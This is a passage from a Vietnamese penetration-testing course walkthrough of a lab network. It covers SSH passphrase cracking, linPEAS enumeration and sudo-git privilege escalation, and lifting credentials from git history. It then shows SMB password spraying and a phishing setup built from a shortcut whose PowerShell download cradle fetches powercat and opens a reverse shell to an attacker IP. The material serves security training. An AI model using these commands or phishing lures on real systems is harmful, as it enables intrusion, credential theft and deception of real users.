                              *Listing 13 - Thử sử dụng SSH private key để truy cập WEBSRV1*

Listing 13 cho thấy SSH private key được bảo vệ bằng một **passphrase**. Do đó, hãy thử bẻ khóa nó bằng **ssh2john** và **john** với wordlist **rockyou.txt**. Sau một lúc, quá trình bẻ khóa thành công như minh họa trong listing sau.

```
kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash

kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho    (id_rsa) 
...
```

                                      *Listing 14 - Bẻ khóa passphrase của SSH private key*

Bây giờ, hãy thử truy cập lại hệ thống thông qua SSH bằng cách cung cấp passphrase vừa bẻ được.

```
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 

Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
...
daniela@websrv1:~$ 
```

                                               *Listing 15 - Truy cập WEBSRV1 thông qua SSH*

Thành công! Chúng ta đã giành được quyền truy cập vào mục tiêu đầu tiên trong bài kiểm thử xâm nhập.

Trước khi chuyển sang phần tiếp theo, nơi chúng ta sẽ thực hiện **post-exploitation enumeration**, hãy thêm passphrase đã bẻ khóa vào file **creds.txt** trong thư mục môi trường làm việc. Do người dùng có xu hướng tái sử dụng mật khẩu và passphrase, chúng ta có thể sẽ cần lại thông tin này ở các giai đoạn sau của đợt đánh giá.

---

## 2.2. Một Liên Kết về Quá Khứ

---

Trong phần trước, chúng ta đã giành được quyền truy cập vào máy mục tiêu **WEBSRV1**. Trong phần này, chúng ta sẽ thực hiện liệt kê cục bộ (local enumeration) để xác định các vector tấn công và thông tin nhạy cảm, đồng thời thử leo thang đặc quyền.

Vì trong một bài kiểm thử xâm nhập chúng ta thường bị ràng buộc bởi thời gian, chẳng hạn như thời lượng của một đợt đánh giá, hãy sử dụng script liệt kê Linux tự động **linPEAS** để thu thập một lượng lớn thông tin và xác định các “low hanging fruit” tiềm năng.

Để làm điều này, hãy sao chép **linpeas.sh** vào thư mục **websrv1** và khởi chạy một web server Python3 để phục vụ file này.

```
kali@kali:~/beyond/websrv1$ cp /usr/share/peass/linpeas/linpeas.sh .

kali@kali:~/beyond/websrv1$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

                                                   *Listing 16 - Phục vụ script liệt kê linpeas*

Trong phiên SSH, chúng ta có thể sử dụng **wget** để tải script liệt kê về. Ngoài ra, chúng ta sẽ dùng **chmod** để biến script thành executable.

```
daniela@websrv1:~$ wget http://192.168.119.5/linpeas.sh
--2022-09-30 12:26:55--  http://192.168.119.5/linpeas.sh                                                                        
Connecting to 192.168.119.5:80... connected.                                                                                    
HTTP request sent, awaiting response... 200 OK                                                                                  
Length: 826127 (807K) [text/x-sh]                                                                                               
Saving to: ‘linpeas.sh’      

linpeas.sh  100%[============================>] 806.76K   662KB/s    in 1.2s     

2022-09-30 12:26:56 (662 KB/s) - ‘linpeas.sh’ saved [826127/826127] 

daniela@websrv1:~$ chmod a+x ./linpeas.sh
```

                                                 *Listing 17 - Tải linpeas và cấp quyền thực thi*

Bây giờ, chúng ta có thể chạy script và bắt đầu liệt kê.

```
daniela@websrv1:~$ ./linpeas.sh
```

                                                 *Listing 18 - Bắt đầu liệt kê cục bộ với linpeas*

Khi script liệt kê chạy xong, hãy xem lại một số kết quả.

Chúng ta sẽ bắt đầu với thông tin hệ thống.

```
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                           
Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022                           
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
```

                                                            *Listing 19 - Thông tin hệ thống*

Listing 19 xác nhận rằng máy đang chạy Ubuntu 22.04 như chúng ta đã xác định thông qua phiên bản dịch vụ OpenSSH.

Tiếp theo, chúng ta sẽ xem các network interface.

```
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                          
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:26:5d brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:265d/64 scope link 
       valid_lft forever preferred_lft forever
```

                                                              *Listing 20 - Network interface*

Listing 20 cho thấy chỉ có một network interface ngoài loopback. Điều này có nghĩa là máy mục tiêu không được kết nối với mạng nội bộ và chúng ta không thể dùng nó làm pivot point.

Vì chúng ta đã liệt kê **MAILSRV1** mà không thu được kết quả có thể khai thác, và máy này cũng không kết nối với mạng nội bộ, chúng ta phải tìm ra thông tin nhạy cảm, chẳng hạn như credential, để giành foothold vào mạng nội bộ. Để lấy file và dữ liệu của người dùng khác và của hệ thống, chúng ta sẽ ưu tiên việc leo thang đặc quyền.

Phần kết quả sau từ linPEAS chứa một thông tin đáng chú ý liên quan đến các lệnh có thể chạy bằng sudo.

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                             
Matching Defaults entries for daniela on websrv1:                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
```

                                                 *Listing 21 - Các lệnh sudo dành cho daniela*

Listing 21 cho thấy daniela có thể chạy **/usr/bin/git** với quyền sudo mà không cần nhập mật khẩu.

Trước khi thử tận dụng phát hiện này để leo thang đặc quyền, hãy hoàn tất việc xem các kết quả linPEAS. Nếu không, chúng ta có thể bỏ lỡ các phát hiện quan trọng.

Phần tiếp theo đáng chú ý là **Analyzing Wordpress Files**, trong đó có một mật khẩu dạng clear-text được sử dụng để truy cập cơ sở dữ liệu.

```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27 11:31 /srv/www/wordpress/wp-config.php                                                                                               
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
```

                                         *Listing 22 - Thiết lập kết nối cơ sở dữ liệu WordPress*

Việc phát hiện một mật khẩu clear-text luôn là một phát hiện có giá trị cao. Hãy lưu mật khẩu này vào file **creds.txt** trên máy Kali để dùng về sau.

Một điểm thú vị khác của phát hiện này là đường dẫn hiển thị bắt đầu bằng **/srv/www/wordpress/**. WordPress instance không được cài ở **/var/www/html**, nơi các ứng dụng web thường nằm trên các hệ thống Linux dựa trên Debian. Mặc dù đây không phải một kết quả có thể khai thác trực tiếp, chúng ta nên ghi nhớ điều này cho các bước tiếp theo.

Hãy tiếp tục xem các kết quả linPEAS. Trong phần **Analyzing Github Files**, chúng ta sẽ thấy rằng thư mục WordPress là một Git repository.

```
╔══════════╣ Analyzing Github Files (limit 70)

drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
```

*Listing 23 - Git repository trong thư mục WordPress*

Dựa trên output ở Listing 23, chúng ta có thể giả định Git được dùng làm hệ thống quản lý phiên bản cho WordPress instance. Việc xem các commit của Git repository có thể cho phép chúng ta xác định các thay đổi trong dữ liệu cấu hình và thông tin nhạy cảm như mật khẩu.

Thư mục này thuộc sở hữu của root và không thể đọc bởi các user khác như hiển thị ở Listing 23. Tuy nhiên, chúng ta có thể tận dụng sudo để dùng các lệnh Git trong ngữ cảnh đặc quyền và từ đó tìm kiếm thông tin nhạy cảm trong repository.

Tạm thời, hãy bỏ qua phần output còn lại của linPEAS và tóm tắt những thông tin và các vector leo thang đặc quyền tiềm năng mà chúng ta đã thu thập được cho đến lúc này.

**WEBSRV1** chạy Ubuntu 22.04 và không kết nối với mạng nội bộ. File sudoers có một entry cho phép daniela chạy **/usr/bin/git** với quyền nâng cao mà không cần cung cấp mật khẩu. Ngoài ra, chúng ta biết rằng thư mục WordPress là một Git repository. Cuối cùng, chúng ta đã thu được một mật khẩu clear-text trong cấu hình kết nối cơ sở dữ liệu WordPress.

Dựa trên những thông tin này, chúng ta có thể xác định ba vector leo thang đặc quyền tiềm năng:

- Lạm dụng sudo command **/usr/bin/git**
- Dùng sudo để tìm kiếm trong Git repository
- Thử truy cập các user khác bằng mật khẩu cơ sở dữ liệu WordPress

Vector hứa hẹn nhất tại thời điểm này là lạm dụng sudo command **/usr/bin/git** vì chúng ta không cần nhập mật khẩu. Hầu hết các lệnh chạy với sudo đều có thể bị lạm dụng để giành một interactive shell với quyền nâng cao.

Để tìm các cách lạm dụng khi một binary như git được phép chạy với sudo, chúng ta có thể tham khảo **GTFOBins**. Trên trang này, chúng ta nhập **git** vào thanh tìm kiếm và chọn nó trong danh sách. Sau đó, hãy cuộn xuống phần **Sudo**.

![image.png](image%206.png)

                                                 *Hình 7: Vector lạm dụng sudo đối với git*

Hình 7 hiển thị hai trong số năm vector lạm dụng tiềm năng để leo thang đặc quyền thông qua git với quyền sudo. Hãy thử cách đầu tiên bằng cách đặt một biến môi trường để thực thi khi mở help menu.

```
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
sudo: sorry, you are not allowed to set the following environment variables: PAGER
```

                                      *Listing 24 - Lạm dụng git sudo bằng cách đặt biến môi trường*

Thật không may, output cho biết chúng ta không được phép đặt biến môi trường.

Tiếp theo, hãy thử vector lạm dụng thứ hai. Lệnh này mở help menu trong pager mặc định. Trên Linux, một trong những pager phổ biến nhất là **less**. Các lệnh điều hướng trong pager tương tự như vi và có thể được dùng để thực thi mã trong ngữ cảnh của tài khoản đã khởi chạy pager.

```
daniela@websrv1:~$ sudo git -p help config
```

           *Listing 25 - Lạm dụng git sudo bằng cách khởi chạy pager trong ngữ cảnh đặc quyền*

Để thực thi lệnh thông qua pager, chúng ta có thể nhập **!** theo sau bởi một lệnh hoặc đường dẫn tới một file thực thi. Như Hình 7 cho thấy, chúng ta có thể nhập đường dẫn tới một shell. Hãy dùng **/bin/bash** để lấy một interactive shell.

```
...
       •   no section or name was provided (ret=2),

       •   the config file is invalid (ret=3),

!/bin/bash

root@websrv1:/home/daniela# whoami
root
```

                               *Listing 26 - Thực thi lệnh qua pager  để lấy interactive shell*

Tốt! Chúng ta đã leo thang đặc quyền thành công trên WEBSRV1.

Có quyền root, chúng ta sẽ tiếp tục liệt kê hệ thống. Trước khi làm điều đó, hãy tìm kiếm thông tin nhạy cảm trong Git repository trước.

Để làm vậy, chúng ta sẽ chuyển thư mục hiện tại sang Git repository. Sau đó, chúng ta có thể dùng **git status** để hiển thị trạng thái của Git working directory và **git log** để xem lịch sử commit.

```
root@websrv1:/home/daniela# cd /srv/www/wordpress/

root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean

root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD -> master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
```

                                                        *Listing 27 - Kiểm tra Git repository*

Listing 27 cho thấy có hai commit trong repository. Một commit là **initial commit** và một commit là **Removed staging script and internal network access**. Điều này khá thú vị vì nó cho thấy máy trước đây từng có quyền truy cập vào mạng nội bộ. Ngoài ra, commit đầu tiên có thể chứa một staging script đã bị xóa.

Chúng ta có thể quay lại một commit cụ thể bằng cách dùng **git checkout** và commit hash. Tuy nhiên, thao tác này có thể làm hỏng chức năng của ứng dụng web và có thể gây gián đoạn hoạt động hàng ngày của khách hàng.

Một cách tiếp cận tốt hơn là dùng **git show**, lệnh này hiển thị sự khác biệt giữa các commit. Trong trường hợp của chúng ta, chúng ta sẽ cung cấp commit hash của commit mới nhất vì chúng ta quan tâm tới những thay đổi sau commit đầu tiên.

```
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
-
```

                                                 *Listing 28 - Hiển thị sự khác biệt giữa hai commit*

Tốt! Bằng cách hiển thị sự khác biệt giữa các commit, chúng ta đã xác định thêm một bộ credential. Cách tự động hóa tác vụ bằng **sshpass** thường được sử dụng để cung cấp mật khẩu theo kiểu không tương tác cho các script.

Trước khi kết thúc phần này, hãy thêm username và password này vào **creds.txt** trên máy Kali.

Trong một đợt đánh giá thực tế, chúng ta nên chạy lại linPEAS sau khi đã có quyền truy cập đặc quyền trên hệ thống. Vì lúc này công cụ có thể truy cập các file của người dùng khác và của hệ thống, nó có thể phát hiện ra thông tin nhạy cảm và dữ liệu mà trước đó không thể truy cập khi chạy với quyền daniela.

Hãy tóm tắt những gì chúng ta đã đạt được trong phần này. Chúng ta đã sử dụng script liệt kê tự động linPEAS để xác định các thông tin nhạy cảm tiềm năng và các vector leo thang đặc quyền. Script xác định rằng **/usr/bin/git** có thể chạy với sudo dưới user daniela, thư mục WordPress là một Git repository, và có một mật khẩu cleartext trong thiết lập cơ sở dữ liệu WordPress. Bằng cách lạm dụng sudo command, chúng ta đã leo thang đặc quyền thành công. Sau đó, chúng ta xác định một bash script trước đây đã bị xóa trong Git repository và hiển thị nó. Script này chứa một username và password mới.

Trong Learning Unit tiếp theo, chúng ta sẽ cấu trúc và tận dụng thông tin đã thu được trong một cuộc tấn công, qua đó giành quyền truy cập vào mạng nội bộ.

---

# 3. Giành Quyền Truy Cập vào Mạng Nội Bộ

---

Learning Unit này bao gồm các Learning Objective sau:

- Xác thực thông tin xác thực domain từ một máy không tham gia domain
- Thực hiện phishing để giành quyền truy cập vào mạng nội bộ

Trong Learning Unit trước, chúng ta đã giành được quyền truy cập đặc quyền vào **WEBSRV1**. Ngoài ra, chúng ta cũng đã xác định được một số mật khẩu và tên người dùng.

Trong Learning Unit này, chúng ta sẽ tận dụng những thông tin đó. Trước hết, chúng ta sẽ cố gắng xác nhận một bộ thông tin xác thực hợp lệ, sau đó sử dụng chúng để giành quyền truy cập vào mạng nội bộ bằng cách chuẩn bị và gửi một e-mail phishing.

---

## 3.1. Thông Tin Xác Thực Domain

---

Trong phần này, chúng ta sẽ cố gắng xác định các tổ hợp tên người dùng và mật khẩu hợp lệ trên **MAILSRV1**. Hãy bắt đầu bằng cách sử dụng các thông tin hiện có trong file **creds.txt** để tạo danh sách tên người dùng và mật khẩu. Trước tiên, hãy xem lại nội dung hiện tại của **creds.txt**.

```
kali@kali:~/beyond$ cat creds.txt                  
daniela:tequieromucho (SSH private key passphrase)
wordpress:DanielKeyboard3311 (WordPress database connection settings)
john:dqsTwTpZPn#nL (fetch_current.sh)

Other identified users:
marcus
```

                                                *Listing 29 - Hiển thị nội dung của creds.txt*

Dựa trên output trong Listing 29, chúng ta sẽ tạo một danh sách tên người dùng bao gồm **marcus**, **john** và **daniela**. Vì **wordpress** không phải là một user thực mà chỉ được dùng cho kết nối cơ sở dữ liệu của WordPress instance trên **WEBSRV1**, chúng ta sẽ loại bỏ nó. Ngoài ra, chúng ta sẽ tạo một danh sách mật khẩu bao gồm **tequieromucho**, **DanielKeyboard3311** và **dqsTwTpZPn#nL**. Cả hai danh sách và nội dung của chúng được hiển thị trong listing sau:

```
kali@kali:~/beyond$ cat usernames.txt                                         
marcus
john
daniela

kali@kali:~/beyond$ cat passwords.txt
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```

       *Listing 30 - Hiển thị các danh sách đã tạo chứa tên người dùng và mật khẩu được xác định*

Bây giờ, chúng ta có hai danh sách chứa các tên người dùng và mật khẩu đã được xác định cho đến thời điểm này.

Bước tiếp theo là sử dụng **crackmapexec** để kiểm tra các thông tin xác thực này đối với dịch vụ **SMB** trên **MAILSRV1**. Chúng ta sẽ chỉ định **--continue-on-success** để tránh việc dừng lại ngay khi tìm thấy bộ thông tin hợp lệ đầu tiên.

```
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
```

                            *Listing 31 - Kiểm tra thông tin xác thực hợp lệ bằng CrackMapExec*

Listing 31 cho thấy **CrackMapExec** đã xác định được một bộ thông tin xác thực hợp lệ. Điều này không quá bất ngờ vì chúng ta đã lấy được username và password từ staging script trên **WEBSRV1**. Tuy nhiên, cũng có khả năng **john** đã thay đổi mật khẩu của mình trong khoảng thời gian đó.

Output cũng cho thấy một tính năng rất hữu ích khác của CrackMapExec: nó đã xác định được tên domain và tự động thêm vào trước các username. Điều này có nghĩa là **MAILSRV1** là một máy đã tham gia domain và chúng ta đã xác định được một bộ **domain credentials** hợp lệ.

Bây giờ khi đã có thông tin xác thực domain hợp lệ, chúng ta cần xây dựng kế hoạch cho các bước tiếp theo. Xem lại output của CrackMapExec và kết quả quét cổng đối với **MAILSRV1**, chúng ta không có nhiều lựa chọn. Chúng ta đã xác định được mail server và SMB, nhưng không có các dịch vụ như **WinRM** hay **RDP**. Ngoài ra, kết quả quét cũng cho thấy **john** không phải là local administrator trên **MAILSRV1**, được thể hiện qua việc không có dấu hiệu **Pwn3d!**.

Điều này cho chúng ta hai lựa chọn. Chúng ta có thể tiếp tục liệt kê SMB trên **MAILSRV1** và kiểm tra xem có thông tin nhạy cảm nào trên các share có thể truy cập được hay không, hoặc chúng ta có thể chuẩn bị một file đính kèm độc hại và gửi một email phishing với tư cách **john** cho **daniela** và **marcus**.

Chúng ta cần lưu ý rằng CrackMapExec sẽ trả về **STATUS_LOGON_FAILURE** không chỉ khi mật khẩu của một user tồn tại không đúng, mà còn khi user đó hoàn toàn không tồn tại. Do đó, tại thời điểm này, chúng ta không thể chắc chắn rằng các domain user **daniela** và **marcus** có thực sự tồn tại hay không.

Hãy chọn lựa chọn thứ nhất trước và tận dụng CrackMapExec để liệt kê các **SMB share** và quyền truy cập của chúng trên **MAILSRV1** bằng cách cung cấp tham số **--shares** cùng với thông tin xác thực của **john**. Chúng ta có thể xác định được các share có thể truy cập chứa thông tin bổ sung mà chúng ta có thể sử dụng cho lựa chọn thứ hai.

```
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares  
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.50.242  445    MAILSRV1         [+] Enumerated shares
SMB         192.168.50.242  445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.50.242  445    MAILSRV1         -----           -----------     ------
SMB         192.168.50.242  445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.50.242  445    MAILSRV1         C$                              Default share
SMB         192.168.50.242  445    MAILSRV1         IPC$            READ            Remote IPC
```

                          *Listing 32 - Liệt kê các SMB share trên MAILSRV1 bằng CrackMapExec*

Listing 32 cho thấy CrackMapExec chỉ xác định được các **default share**, trên đó chúng ta không có quyền nào có thể khai thác được.

Tại thời điểm này, chúng ta chỉ còn lại lựa chọn thứ hai: chuẩn bị một email với file đính kèm độc hại và gửi nó tới **daniela** và **marcus**.

Hãy tóm tắt những gì chúng ta đã thực hiện trong phần này. Trước tiên, chúng ta đã sử dụng các thông tin thu được ở Learning Unit trước và tận dụng chúng trong một cuộc tấn công mật khẩu nhắm vào **MAILSRV1**. Cuộc tấn công này đã giúp chúng ta phát hiện một bộ thông tin xác thực hợp lệ. Sau đó, chúng ta đã liệt kê các SMB share trên **MAILSRV1** với tư cách **john** nhưng không thu được kết quả nào có thể khai thác.

---

## 3.2. Phishing để Giành Quyền Truy Cập

---

Trong phần này, chúng ta sẽ thực hiện một cuộc tấn công phía client bằng cách gửi một e-mail phishing. Trong suốt khóa học này, chúng ta chủ yếu đã thảo luận hai kỹ thuật tấn công phía client: các tài liệu Microsoft Office chứa Macro và các file Windows Library kết hợp với shortcut file.

Vì chúng ta không có bất kỳ thông tin nào về các máy nội bộ hay hạ tầng bên trong, chúng ta sẽ chọn kỹ thuật thứ hai, do Microsoft Office có thể không được cài đặt trên bất kỳ hệ thống mục tiêu nào.

Đối với cuộc tấn công này, chúng ta cần thiết lập một WebDAV server, một Python3 web server, một Netcat listener, và chuẩn bị các file Windows Library cùng shortcut.

Hãy bắt đầu bằng việc thiết lập WebDAV share trên máy Kali của chúng ta ở cổng 80 bằng **wsgidav**. Ngoài ra, chúng ta sẽ tạo thư mục **/home/kali/beyond/webdav** làm thư mục gốc cho WebDAV.

```
kali@kali:~$ mkdir /home/kali/beyond/webdav

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
Running without configuration file.
04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
04:47:04.861 - INFO    : Property manager:  None
04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
04:47:04.861 - INFO    : Registered DAV providers by route:
04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...
```

                                                 *Listing 33 - Khởi chạy WsgiDAV trên cổng 80*

Listing 33 cho thấy WebDAV share của chúng ta hiện đã được phục vụ trên cổng 80 với cấu hình truy cập ẩn danh.

Tiếp theo, hãy kết nối tới **WINPREP** qua RDP với user **offsec** và mật khẩu **lab** để chuẩn bị các file Windows Library và shortcut. Sau khi kết nối, chúng ta sẽ mở **Visual Studio Code** và tạo một file văn bản mới trên Desktop có tên **config.Library-ms**.

![image.png](image%207.png)

                                         *Hình 8: File Library trống trong Visual Studio Code*

Bây giờ, hãy sao chép đoạn mã Windows Library mà chúng ta đã sử dụng trước đó trong Module **Client-Side Attacks**, dán nó vào Visual Studio Code và kiểm tra rằng địa chỉ IP trỏ về máy Kali của chúng ta.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

                    *Listing 34 - Mã Windows Library để kết nối tới WebDAV Share của chúng ta*

Hãy lưu file này và chuyển nó sang **/home/kali/beyond** trên máy Kali.

Tiếp theo, chúng ta sẽ tạo shortcut file trên **WINPREP**. Để làm điều này, chúng ta nhấp chuột phải trên Desktop và chọn **New > Shortcut**. Khi nạn nhân double-click vào shortcut file, PowerCat sẽ được tải về và một reverse shell sẽ được tạo. Chúng ta có thể nhập lệnh sau để thực hiện điều này:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

   *Listing 35 - PowerShell Download Cradle và thực thi PowerCat Reverse Shell cho shortcut file*

Sau khi nhập lệnh và đặt tên cho shortcut file, chúng ta có thể chuyển shortcut file thu được sang máy Kali vào thư mục WebDAV.

Bước tiếp theo là phục vụ **PowerCat** thông qua một Python3 web server. Hãy sao chép **powercat.ps1** vào **/home/kali/beyond** và phục vụ nó trên cổng **8000** như đã chỉ định trong lệnh PowerShell của shortcut.

```
kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~/beyond$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

                      *Listing 36 - Phục vụ powercat.ps1 trên cổng 8000 bằng Python3 web server*

Khi Python3 web server đã chạy, chúng ta có thể khởi động một Netcat listener trên cổng **4444** trong một terminal tab mới để bắt reverse shell từ PowerCat.

```
kali@kali:~/beyond$ nc -nvlp 4444      
listening on [any] 4444 ...
```

                                    *Listing 37 - Lắng nghe trên cổng 4444 bằng Netcat*

Với Netcat đang chạy, tất cả các dịch vụ và file đã được chuẩn bị xong. Bây giờ, hãy tạo email.

Chúng ta cũng có thể sử dụng WebDAV share để phục vụ PowerCat thay vì Python3 web server. Tuy nhiên, việc phục vụ file qua một cổng khác mang lại cho chúng ta thêm sự linh hoạt.

Để gửi email, chúng ta sẽ sử dụng công cụ dòng lệnh kiểm thử SMTP **swaks**. Trước tiên, hãy tạo nội dung email chứa pretext. Vì chúng ta không có thông tin cụ thể về bất kỳ người dùng nào, chúng ta phải sử dụng nội dung mang tính chung chung hơn. May mắn là chúng ta đã thu được một số thông tin về công ty mục tiêu trên **WEBSRV1** thông qua Git repository.

Việc đưa vào những thông tin chỉ nhân viên hoặc nội bộ mới biết sẽ làm tăng đáng kể khả năng file đính kèm được mở.

Chúng ta sẽ tạo file **body.txt** trong **/home/kali/beyond** với nội dung sau:

```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

Hy vọng rằng nội dung này sẽ thuyết phục **marcus** hoặc **daniela** mở file đính kèm của chúng ta.

Trong một đợt đánh giá thực tế, chúng ta cũng nên sử dụng các kỹ thuật thu thập thông tin thụ động để thu thập thêm thông tin về mục tiêu tiềm năng. Dựa trên các thông tin đó, chúng ta có thể tạo các email được cá nhân hóa hơn và tăng đáng kể khả năng thành công.

Bây giờ, chúng ta đã sẵn sàng xây dựng lệnh **swaks** để gửi email. Chúng ta sẽ chỉ định **daniela@beyond.com** và **marcus@beyond.com** là người nhận email với **-t**, **john@beyond.com** làm địa chỉ người gửi trong email envelope với **--from**, và file Windows Library cho **--attach**. Tiếp theo, chúng ta sẽ dùng **--suppress-data** để tóm tắt thông tin về các giao dịch SMTP. Đối với subject và body của email, chúng ta sẽ cung cấp **Subject: Staging Script** cho **--header** và **body.txt** cho **--body**. Ngoài ra, chúng ta sẽ nhập địa chỉ IP của **MAILSRV1** cho **--server**. Cuối cùng, chúng ta sẽ thêm **-ap** để bật xác thực bằng mật khẩu.

